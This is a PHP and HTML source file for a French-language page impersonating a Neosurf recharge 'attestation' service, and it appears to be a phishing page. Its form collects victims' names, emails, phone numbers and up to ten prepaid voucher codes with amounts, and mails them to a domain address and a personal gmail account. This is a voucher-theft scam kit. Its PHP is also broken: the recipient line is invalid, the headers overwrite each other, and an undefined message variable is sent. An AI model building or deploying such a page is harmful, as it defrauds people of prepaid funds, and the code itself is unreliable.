<?php

session_start();

//If form send and all fields is not empty
if(!empty($_POST)){

    $errors = array();

    extract($_POST);

    $fname = strip_tags($fname);
    $email = strip_tags($email);
    $phone = strip_tags($phone);
    $montant = strip_tags($montant);
    $ticket = strip_tags($ticket);



    if(empty($fname)){
        array_push($errors, 'Entrez votre nom et prénoms');
    }
    if(empty($email)){
        array_push($errors, 'Entrez votre email');
    }

    if(empty($montant)){
        array_push($errors, 'Entrez le montant');
    }

    if(empty($ticket)){
        array_push($errors, 'Entrez le ticket');
    }

    if(empty($phone)){
        array_push($errors, 'Entrez votre numéro de téléphone');
    }

    if(!filter_var($email, FILTER_VALIDATE_EMAIL)){
        array_push($errors, 'Adresse email invalide');
    }

    if(count($errors) == 0){
        $mailTo = "neosurf@fiches-attestationdesrecharges.com", "kilmeraf90@gmail.com";
        $headers = "From: Site de Fiche d'attestation des recharges\r\n";
        $headers = "Reply-To: neosurf@fiches-attestationdesrecharges.com\r\n";
        $headers = "Content-type: text/html\r\n";
        $subject = "Demande de Téléchargement de fiche de recharge de la part de ".$fname.".";
        $txt = "Demande de Téléchargement de fiche de recharge :\n\n- Type de recharge : NeoSurf.\n\n- Nom du client : ".$fname.".\n\n- Adresse mail du client : ".$email.".\n\n- Montant : ".$montant.".\n\n- Numéro de téléphone : ".$phone.".\n\n- Numéro du ticket : ".$ticket.".";

        mail($mailTo, $subject, $message, $headers);

        unset($mailTo);
        unset($headers);
        unset($subject);
        unset($txt);

        header("Location: answer.html");
    }
}

?>

<!doctype html>
<html lang="en">
  <head>
  	<title>Neosurf - Fiche d'attestation des recharges</title>
    <meta charset="utf-8">
    <meta name="description" content="Fiche d'attestation des recharges">
    <meta name="keywords" content="Fiche d'attestation des recharges, paysafe, neosurf, pcs, transcash, recharge transcash, recharge pcs, recharge neosurf, recharge paysafe">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <link href="https://fonts.googleapis.com/css?family=Poppins:300,400,500,600,700,800,900" rel="stylesheet">
		
		<link rel="stylesheet" href="css/owl.carousel.min.css">
    <link rel="stylesheet" href="css/owl.theme.default.min.css">
		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/ionicons/4.5.6/css/ionicons.min.css">
		<link rel="stylesheet" href="css/style.css">
    <link rel="stylesheet" href="css/main.css">
  </head>
  <body>
	<header>
        <nav class="navbar navbar-expand-md navbar-dark fixed-top bg-dark">
          <div class="container-fluid">
            <a class="navbar-brand" href="attestation.php">Téléchargement d'attestation</a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarCollapse" aria-controls="navbarCollapse" aria-expanded="false" aria-label="Toggle navigation">
              <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse navbar-collapse" id="navbarCollapse">
              <ul class="navbar-nav me-auto mb-2 mb-md-0">
                <li class="nav-item">
                  <a class="nav-link" href="index.php">Accueil</a>
                </li>
                <li class="nav-item">
                  <a class="nav-link active" href="attestation.php">Télécharger une fiche d'attestation</a>
                </li>
                <li class="nav-item">
                  <a class="nav-link" href="refund.php">Demande de remboursement</a>
                </li>
              </ul>
            </div>
          </div>
        </nav>
      </header>

    <div class="container-fluid px-1 py-5 mx-auto">
        <div class="row d-flex justify-content-center">
            <div class="col-xl-7 col-lg-8 col-md-9 col-11 text-center">
                <h3 class="space">Neosurf</h3> <br>
                <figure class="margin-bottom-medium">
                    <img src="images/neosurf.jpg" height="100" width="200" class="footer-logo" alt="Neosurf">
                </figure>
                <div class="card">
                    <form class="form-card" action="envois/neosurf.php" method="POST">
                        <div class="row justify-content-between text-left">
                            <div class="form-group col-sm-12 flex-column d-flex">
                                <input type="text" id="fname" name="fname" placeholder="Nom complet" required="required"
                                    onblur="validate(1)">
                            </div>
                        </div>
                        <div class="row justify-content-between text-left">
                            <div class="form-group col-sm-12 flex-column d-flex">
                                <input type="text" id="email" name="email" placeholder="Email" required="required"
                                    onblur="validate(2)">
                            </div>
                        </div>
                        <div class="row justify-content-between text-left">
                            <div class="form-group col-sm-12 flex-column d-flex">
                                <input type="number" id="phone" name="phone" placeholder="N° de Téléphone"
                                    required="required" onblur="validate(5)">
                            </div>
                        </div>
                        <div class="row justify-content-between">
                            <div class="col-1 col-sm-3"></div>
                            <div class="form-group col-9 col-sm-6">
                                <button type="button" id="hide" class="btn btn-secondary">Masquer le Code</button>
                            </div>
                            <div class="col-1 col-sm-3"></div>
                        </div>
                        <div id="row">
                            <div class="row justify-content-between text-left">
                                <div class="form-group col-5 flex-column d-flex">
                                    <input type="text" id="ticket" name="ticket[]" placeholder="Code du ticket" minlength="10" 
                                        maxlength="10" size="10" required="required" onblur="validate(4)" oninput="javascript: if (this.value.length > 10) this.value = this.value.slice(0, 10);">
                                </div>
                                <div class="form-group col-5 flex-column d-flex">
                                    <select name="montant[]" id="montant" required="required" onblur="validate(12)">
                                        <option selected="selected">Montant</option>
                                        <option value="20.00 €">20.00 €</option>
                                        <option value="30.00 €">30.00 €</option>
                                        <option value="50.00 €">50.00 €</option>
                                        <option value="100.00 €">100.00 €</option>
                                        <option value="150.00 €">150.00 €</option>
                                        <option value="200.00 €">200.00 €</option>
                                        <option value="250.00 €">250.00 €</option>
                                        <option value="500.00 €">500.00 €</option>
                                    </select>
                                </div>
                                <div class="col-1"></div>
                            </div>
                        </div>

                        <div class="row justify-content-between">
                            <div class="col-1 col-sm-3"></div>
                            <div class="form-group col-9 col-sm-6">
                                <button type="button" id="add" class="btn btn-dark plus-btn">Code supplémentaire</button>
                            </div>
                            <div class="col-1 col-sm-3"></div>
                        </div>

                        <div class="row justify-content-end">
                            <div class="form-group col-sm-6">
                                <button type="submit" class="btn-block btn-success">Télécharger attestation</button>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>

    <footer class="text-muted">
      <div class="container">
          <p class="float-right">
            Love
          </p>
          <p>Made by love with BootStrap</p>
      </div>
    </footer>

    <script src="js/jquery.min.js"></script>
    <script src="js/popper.js"></script>
    <script src="js/bootstrap.min.js"></script>
    <script src="js/owl.carousel.min.js"></script>
    <script src="js/main.js"></script>
    <script src="js/bootstrap.bundle.min.js"></script>
    <script>
        $(document).ready(function () {
            var max_fields = 10;
            var i = 1;
            $('#add').click(function () {
                if (i < max_fields) {
                    i++;
                    $('#row').append('<div class="row justify-content-between text-left" id="row' + i + '"><div class="form-group col-5 flex-column d-flex"><input type="text" id="ticket' + i + '" name="ticket[]" placeholder="Code du ticket" minlength="10" maxlength="10" size="10" required="required" onblur="validate(4)" oninput="javascript: if (this.value.length > 10) this.value = this.value.slice(0, 10);"></div><div class="form-group col-5 flex-column d-flex"><select name="montant[]" id="montant" required="required" onblur="validate(12)"><option selected="selected">Montant</option><option value="20.00 €">20.00 €</option><option value="30.00 €">30.00 €</option><option value="50.00 €">50.00 €</option><option value="100.00 €">100.00 €</option><option value="150.00 €">150.00 €</option><option value="200.00 €">200.00 €</option><option value="250.00 €">250.00 €</option><option value="500.00 €">500.00 €</option></select></div><div class="form-group col-1 flex-column d-flex"><button id="' + i + '" type="button" class="remove-btn form-control btn-danger">x</button></div></div>')
                }
            });
            $(document).on('click', '.remove-btn', function () {
                var button_id = $(this).attr("id");
                i--;
                $('#row' + button_id + '').remove();
            });
        });
    </script>

    <script>
        const btn = document.getElementById("hide");

        btn.addEventListener("click", ()=>{

            if(btn.innerText === "Masquer le Code"){
                btn.innerText = "Afficher le Code";
                btn.className= "btn btn-secondary Old";
            }else{
                btn.innerText= "Masquer le Code";
                btn.className= "btn btn-secondary New";
            }
        });
    </script>

</body>

</html>